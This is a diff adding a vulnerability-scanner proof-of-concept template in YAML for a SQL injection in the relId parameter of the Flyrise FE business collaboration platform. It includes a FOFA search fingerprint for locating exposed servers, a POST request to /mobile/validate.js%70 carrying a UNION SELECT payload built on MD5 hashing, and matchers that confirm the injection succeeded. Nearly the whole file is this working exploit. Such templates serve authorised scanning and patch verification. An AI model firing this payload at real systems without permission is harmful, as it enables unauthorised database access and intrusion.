@@ -1,0 +1,29 @@
+id: poc-yaml-flyrise-enterprise-relid-sqli
+info:
+  name: 飞企互联FE业务协作平台 relId SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /mobile/validate.js%70
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: json={"relId":"1'+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2CNULL%2CNULL--+wMCa","type":"0"}
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"flowCode\":") &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"\"errorCode\":") &&
+
+    !contains(body,"<")
+
+    '
+transport: http
